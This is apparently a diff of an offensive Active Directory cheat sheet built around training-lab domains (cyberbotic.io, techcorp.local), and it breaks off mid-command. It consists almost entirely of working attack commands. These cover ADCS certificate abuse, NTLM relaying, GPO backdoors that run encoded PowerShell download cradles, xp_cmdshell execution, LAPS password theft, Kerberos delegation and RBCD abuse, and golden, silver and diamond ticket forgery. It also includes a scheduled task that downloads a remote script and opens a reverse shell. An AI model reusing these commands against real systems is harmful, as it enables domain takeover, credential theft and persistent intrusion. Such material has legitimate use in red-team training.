-# Attack Case 1: _ENROLLEE_SUPPLIES_SUBJECT_
-
-beacon> getuid
-beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
-
-ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-
-ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0
-
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap
-
-
-# Attack Case 2 : NTLMRelay on CA web endpoint
-
-# NTLM Relaying to ADCS HTTP Endpoints
-- Web End point for certificate services is at http[s]://<hostname>/certsrv.
-- Redirect the NTLM auth traffic using PrintSpool attack from DC to CA (if services running on seperate system) to fetch the DC Certificate
-- But if they are both running on same server then we can execute the attack targetting a system where unconstrained delegation (WEB) is allowed, and force it to authenticate with CA to capture its certificate
-- Do the same setup for ntlmrelayx and use print spooler to force DC/WEB to authenticate with wkstn2
-
-
-1. Setup socks proxy (beacon session)
-beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging
-
-2. Setup Proxychains to use this proxy
-$ sudo vim /etc/proxychains.conf
-socks5 127.0.0.1 1080 socks_user socks_password
-
-3. Execute NTLMRelayx to target the certificate server endpoint
-attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
-
-4. Setup reverse port forwarding (System shell)
-beacon> rportfwd 8445 127.0.0.1 445
-
-5. Upload PortBender driver and load its cna file (System shell)
-beacon> cd C:\Windows\system32\drivers
-beacon> upload C:\Tools\PortBender\WinDivert64.sys
-beacon> PortBender redirect 445 8445
-
-6. Use PrintSpool attack to force WEB (unconstrained) server to authenticate with wkstn 2 (Domain Sesion)
-beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102
-
-7. Use the Base64 encoded machine certificate obtained to get TGT of machine account
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /nowrap
-
-8. Use the TGT ticket obtained for S4U attack to get a service ticket
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap
-
-9. Inject the Service Ticket by creating a new sacrificial token
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=
-
-10. Steal token and access the service
-beacon> steal_token 1234
-beacon> ls \\web.dev.cyberbotic.io\c$
-
-
-## User and Computer Persistance
-
-# User Persistance
-
-1. Enumerate user certificate from their Personal Certificate store (execute from user session)
-beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates
-
-2. Export the certificate as DER and PFX file on disk
-beacon> mimikatz crypto::certificates /export
-
-3. Encode the PFX file to be used with Rubeus
-ubuntu@DESKTOP-3BSK7NO ~> cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0
-
-4. Use certificate to request TGT for the user (/enctype:aes256 - Better OPSEC)
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /enctype:aes256 /nowrap
-
-5. if certificate is not present then requst from his loggedin session and then follow above steps
-beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User
-
-# Computer Persistance 
-
-1. Export the machine certificate (requires elevated session)
-beacon> mimikatz !crypto::certificates /systemstore:local_machine /export
-
-2. Encode the certificate, and use it to get TGT for machine account
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap
-
-3. If machine certificate it not stored, we can requet it using Certify (/machine param is required for auto elevation to system privilege)
-beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine
-
-```
-
-### Group Policy
+#### Local Administrator Password Solution (LAPS)
 
 ```powershell
 
-# Modify Existing GPO
+# Check for presence of AdmPwd.dll at below location on the Machine locally
+ls 'C:\Program Files\LAPS\CSE\AdmPwd.dll'
 
-1. Identify GPO where current principal has modify rights
-beacon> powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
+# Check existance of LAPS in domain
+Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'
+Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime | select-object samaccountname
+Get-DomainGPO -Identity *LAPS*
 
-2. Resolve GPOName, Path and SID of principal
-beacon> powerpick Get-DomainGPO -Identity "CN={AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
+# Check to which computers the LAPS GPO is applied to
+Get-DomainOU -GPLink "Distinguishedname from GET-DOMAINGPO -Identity *LAPS*" | select name, distinguishedname
+Get-DomainComputer -Searchbase "LDAP://<distinguishedname>" -Properties Distinguishedname
 
-beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
+# Parse the GPO policy file for LAPS (https://github.com/PowerShell/GPRegistryPolicy))
+Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
 
-beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}
+# Fetch the password for given system, if current user has Read/GenericAll access
+Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
+Get-DomainComputer -Identity us-mailmgmt | select name,ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
 
-3. Identify the domain OU where the above GPO applies
-beacon> powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName
+# Find users who can read the LAPS password of machine in OU
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')}
 
-4. Identify the systems under the given OU
-beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
 
-5. Setup a pivot listener(1234) on the beacon, and download & execute cradle pointing to pivot (80)
-PS> IEX ((new-object net.webclient).downloadstring("http://wkstn-2:8080/pivot"))
+# Using AD module
+. .\Get-lapsPermissions.ps1
+Get-AdmPwdPassword -ComputerName US-MAILMGMT
 
-
-6. Enable inbound traffic on Pivot Listener (1234) and WebDrive by ports (8080) (requires system access)
-beacon> powerpick New-NetFirewallRule -DisplayName "Rule 1" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 1234
-beacon> powerpick New-NetFirewallRule -DisplayName "Rule 2" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
-
-7. Setup port forwarding rule to accept the Payload Download request locally and forward to our team server 
-beacon> rportfwd 8080 127.0.0.1 80
-
-8. Use sharpGPOAbuse to add the backdoor (scheduled task) for execution on targetted system
-beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "C:\Windows\System32\cmd.exe" --Arguments "/c powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAHAAaQB2AG8AdAAiACkAKQA=" --GPOName "Vulnerable GPO"
-
-
-# Create and Link new GPO
-
-1. Check the rights to create a new GPO in Domain
-beacon> powerpick Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
-
-2. Find the OU where any principal has "Write gPlink Privilege"
-beacon> powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
-
-beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
-DEV\Developers
-
-3. Verify if RSAT module is installed for GPO abuse
-beacon> powerpick Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
-
-4. Create a new GPO & configure it to execute attacker binary via Registry loaded from shared location
-beacon> powerpick New-GPO -Name "Evil GPO"
-
-beacon> powerpick Find-DomainShare -CheckShareAccess
-beacon> cd \\dc-2\software
-beacon> upload C:\Payloads\pivot.exe
-beacon> powerpick Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe" -Type ExpandString
-
-5. Link newly created GPO with OU
-beacon> powerpick Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
+# Using LAPS Module
+Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
+Find-AdmPwdExtendedRights -Identity OUDistinguishedName
+Get-AdmPwdPassword -ComputerName US-MAILMGMT
 
 ```
 
 
-### MSSQL Servers
+#### Active Directory Certificate Services (ADCS)
 
 ```powershell
 
-# Use PowerUpSQL for enumerating MS SQL Server instances
-beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
-beacon> powerpick Get-SQLInstanceDomain
+# Conditions of vulnerable certificate template which can be abused
+- CA grants normal/low privileged users enrollment rights
+- Manager approval is disabled
+- Authorization signatures are not required
+- target template grants normal/low privileged users enrollment rights
 
-# Check access to DB instance with current user session
-beacon> powerpick Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl
-beacon> powerpick Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"
-beacon> powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 
-# Query execution
-beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"
+>> Enumerating - Active Directory certificate Service (ADCS) 
 
-# Command Execution
-beacon> powerpick Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
+# Identify the ADCS service installation
+Certify.exe cas
 
-# Interactive access and RCE (xp_cmdshell 0 means it is disabled, needs to be enabled)
-ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25 -debug
+# Enumerate the templates configured
+Certify.exe find
 
-SQL> EXEC xp_cmdshell 'whoami';
-SQL> SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
-SQL> sp_configure 'Show Advanced Options', 1; RECONFIGURE;
-SQL> sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+# Enumerate the vulnerable templates
+Certify.exe find /vulnerable
 
-SQL> EXEC xp_cmdshell 'powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBwAGkAdgBvAHQAIgApAA==';
+# If the enrolleeSuppliesSubject is not not allowed for all domain users, it wont show up in vulnerable template and needs to enumerated seperately (ESC1)
+Certify.exe find /enrolleeSuppliesSubject
 
-# Lateral Movement (using DB Links)
-beacon> powerpick Get-SQLServerLink -Instance "sql-2.dev.cyberbotic.io,1433"
-beacon> powerpick Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
-beacon> powerpick Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433" -Query "exec master..xp_cmdshell 'whoami'"
 
-SQL> SELECT * FROM master..sysservers;
-SQL> SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
-SQL> SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
+>> Persistance (THEFT-4): Extracting User and Machine certificates
 
-SQL> EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
-SQL> EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
+# List all certificates for local machine in certificate store
+ls cert:\LocalMachine\My
 
-SQL> SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHAAaQB2AG8AdAAyACIAKQA=''')
+# Export the certificate in PFX format
+ls cert:\LocalMachine\My\89C1171F6810A6725A47DB8D572537D736D4FF17 | Export-PfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (ConvertTo-SecureString -String 'niks' -Force -AsPlainText)
 
-# MSSQL PrivEsc - Service Account (SeImpersonate) to System 
+# Use Mimikatz to export certificate in pfx format (default cert pass is mimikatz)
+Invoke-mimikatz -Command "crypto::certificates /export"
+Invoke-mimikatz -Command "!crypto::certificates /systemstore:local_machine /export"
+cat cert.pfx | base64 -w 0
+C:\AD\Tools\Rubeus.exe asktgt /user:nlamb /certificate:MNeg[...]IH0A== /password:mimikatz /nowrap /ptt
 
-beacon> getuid
-beacon> shell whoami /priv
-beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
 
-beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHQAYwBwAC0AbABvAGMAYQBsACIAKQA="
 
-beacon> connect localhost 4444
+>> Escalation (ESC-1) : Domain User to Domain Admin and Enterprise Admin 
+
+CASE I: Domain Admin
+
+# Request certificate for DA user using ESC1 technique, and save it as cert.pem
+Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
+
+# Convert cert.pem to cert.pfx format
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
+
+# Request TGT using pfx cerificate and inject into memory
+Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:niks /nowrap /ptt
+
+CASE II: Enterprise Admin
+
+# Request certificate for EA user using ESC1 technique
+Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
+
+# Convert cert.pem to cert.pfx format
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\EA.pfx
+
+# Request TGT using pfx cerificate and inject into memory
+Rubeus.exe asktgt /user:techcorp.local\Administrator
+/dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:niks /nowrap /ptt
+
 ```
 
-### Domain Dominance
 
-	psexec |  CIFS 
-	winrm  |  HOST & HTTP 
-	dcsync (DCs only) | LDAP
+#### Kerberos Delegation
 
 ```powershell
 
-# Silver Ticket (offline)
+>> Unconstrained Delegation
 
-1. Fetch the kerberos ekeys using mimikatz
-beacon> mimikatz !sekurlsa:ekeys
+# Step 1. Identify Computer Account with Unconstrained Delegation
+Get-DomainComputer -Unconstrained | select samaccountname
 
-2. Generate the silver Ticket TGS offline using Rubeus (use /rc4 flag for NTLM hash)
-PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:c9e598cd2a9b08fe31936f2c1846a8365d85147f75b8000cbc90e3c9de50fcc7 /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
+# Step 2. Use PrintSpool attack to force DC$ machine account running print spooler service to authenticate with our Web server having unconstrained delegation enabled. 
+.\MS-RPRN.exe \\us-dc.techcorp.local \\us-web.us.techcorp.local
+.\Petitpotam.exe us-web us-dc
 
-3. Inject the ticket and Verify the access 
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=
-beacon> steal_token 5668
-beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
+# Step 3. Login to unconstrained server and execute Rubeus to monitor for ticket
+.\Rubeus.exe monitor /nowrap /targetuser:US-DC$ /interval:5
 
+# Step 4. Use the Base64 encoded TGT 
+.\Rubeus.exe ptt /ticket:abcd==
 
-# Golden Ticket (offline)
+NOTE: Above injected ticket cannot be used directly for code execution but DCSync will work
 
-1. Fetch the NTLM/AES hash of krbtgt account
-beacon> dcsync dev.cyberbotic.io DEV\krbtgt
-
-2. Generate Golden ticket offline using Rubeus
-PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
-
-3. Inject golden ticket and gain acess
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=
-
-beacon> steal_token 5060
-beacon> run klist
-beacon> ls \\dc-2.dev.cyberbotic.io\c$
+# Step 5. DCsync 
+. .\Invoke-Mimi.ps1
+Invoke-Mimi -Command '"lsadump::dcsync /user:us\krbtgt"'
+Invoke-Mimi -Command '"lsadump::dcsync /user:us\Administrator"'
+C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local
 
 
-# Diamond Ticket (online)
+>> Constrained Delegation
 
-1. Fetch the SID of Ticket User
-beacon> powerpick ConvertTo-SID dev/nlamb
+- Kerberos Only delegation
+- Protocol Transition for non kerberos service
 
-2. Create Diamond ticket (512 - Enterprise Group ID, krbkey - Hash of KRBRGT account)
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
+# Step 1. Identify a Computer or User account having constrained delegation enabled
+Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
 
-3. Verify the specs of Diamond ticket vs Golden ticket
-PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=
+# Steo 2. Request TGS for Alternate service using the session of affected user
+.\Rubeus.exe s4u /user:appsvc /rc4:1d49d390ac01d568f0ee9be82bb74d4c /impersonateuser:Administrator /msdsspn:"CIFS/us-mssql" /altservice:HTTP /domain:us.techcorp.local /ptt
+
+# Step 3. Access the service
+winrs -r:us-mssql cmd
+
+NOTE: Use the same name for remote connection as specified in msdsspn attribute
 
 
-# Forged certificates (DC or CA Server)
 
-1. Dump the Private Key and Certificate of CA (to be executed on DC/CA)
-beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine
+>> Resource Based Constrained Delegation (RBCD) attack
 
-2. Save the certificate in .pem file and convert into pfx format using openssl
-ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+- Requires admin rights on one of domian joined system or ablility to join our computer to domain
+- Write permission on Target System to set msDS-AllowedToActOnBehalfOfOtherIdentity attribute
 
-3. Next, use the stolen CA cert to generate fake cert for nlamb user
-PS C:\Users\Attacker> C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123
 
-4. Encode the certificate
-ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0
+CASE I: Using existing Computer for RBCD attack
 
-5. Use the certificate to get TGT for nlamb user
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACAQ[...snip...]IEAAAA /password:pass123 /nowrap
+STEP 1. Identify the Computer(us-helpdesk) where our principal (mgmtadmin) has GenericAll/Write access 
 
-6. Inject the ticket and access the service
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=
+ps> Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}
 
-beacon> steal_token 5060
-beacon> run klist
-beacon> ls \\dc-2.dev.cyberbotic.io\c$
+ps> Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
+
+STEP 2. Set the delegation attribute to a Computer Account where we have local admin access (student41$)
+
+# Find the SID of Computer Account (student41)
+ps> Get-DomainComputer -Identity student41 -Properties objectSid
+
+# Login as mgmtadmin user, and Set the delegation attribute to Computer Account (us-helpdesk)
+ps> $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-210670787-2521448726-163245708-16151)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "us-helpdesk" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
+
+STEP 3. Perform PTH using student41$ computer account
+
+ps> Rubeus.exe s4u /user:student41$ /rc4:b62c7c107072398d7c81a2639e986b97 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
+
+STEP 4. Access the system as admin
+winrs -r:us-helpdesk cmd.exe
+
+
+CASE II. Creating fake computer account for RBCD attack
+
+- Every domain user can add machines to Ad based ms-DS-MachineAccountQuota which is set to 10, which will allow us to create fake computer object with known password and add it to domain
+- Write Permission on Target System to set msDS-AllowedToActOnBehalfOfOtherIdentity
+
+STEP 1. Create a new Machine Account user PowerMad.ps1 script
+ps> . C:\AD\Tools\Powermad.ps1
+ps> New-MachineAccount -MachineAccount studentcompX
+
+STEP 2. Use above Computer account (created by powermad) instead of student41$ machine account, and rest of the steps stay the same.
+
 
 ```
 
-### Forest & Domain Trusts
+
+## Kerberos Attacks
+
+#### Golden Ticket
+
+```powershell
+# Persistance technique for creating fake TGT ticket using KDC account hash (krbtgt)
+
+# Get Domain Detals
+Get-Domain | select name
+us.techcorp.local
+
+Get-DomainSID
+S-1-5-21-210670787-2521448726-163245708
+
+# Fetch krbtgt ntlm and aes hash
+Invoke-Mimi -Command '"lsadump::dcsync /user:krbtgt"'
+
+# Use above details to create a golden ticket impersonating Administrator user
+Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden_tkt.kirbi"'
+
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+# Use Golden Ticket to gain RCE on DC
+klist
+Enter-PSSession -ComputerName us-dc
+```
+
+#### Silver Ticket
+
+```powershell
+# Comman Attack Scenario, if you have TGT of machine account...Then Silver Ticket can b ecrafted to one of the services as CIFS, HOST, HTTP etc and gain RCE on the system
+
+# Fetch the NTLM hash of the machine account US-DC$
+Invoke-Mimi -Command '"lsadump::dcsync /user:us\US-DC$"'
+f4492105cb24a843356945e45402073e
+
+# Craft a silver ticket for CIFS service on DC using DC$ machine account NTLM hash
+Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:CIFS /rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:CIFS /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+ls \\us-dc.us.techcorp.local\c$
+
+# Craft HOST service ticket
+Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:HOST /rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+# Use Scheduled task to get RCE on DC via HOST Service
+schtasks /create /S us-dc.us.techcorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck41" /TR "powershell.exe -c 'iex (iwr http://192.168.100.41:8080/dakiya.ps1  -UseBasicParsing); reverse -Reverse -IPAddress 192.168.100.41 -Port 8081'"
+
+.\nc64.exe -lvp 8081
+powercat -l -v -p 443 -t 1000
+
+schtasks /Run /S us-dc.us.techcorp.local /TN "STCheck41"
+
+NOTE: HOST - Scheduled Task | HOST + RPCSS - PowerShell remoting & WMI | LDAP - DCSync | WSMAN | CIFS
+
+```
+
+#### Diamond Ticket
+
+```powershell
+# Instead of creating completely forged ticket, it fetches valid TGT and modifies required attributes 
+
+# Request TGT for StudentUserX and modify the parameters to create a diamond ticket
+Rubeus.exe diamond
+/krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
+/user:studentuserx /password:studentuserxpassword /enctype:aes
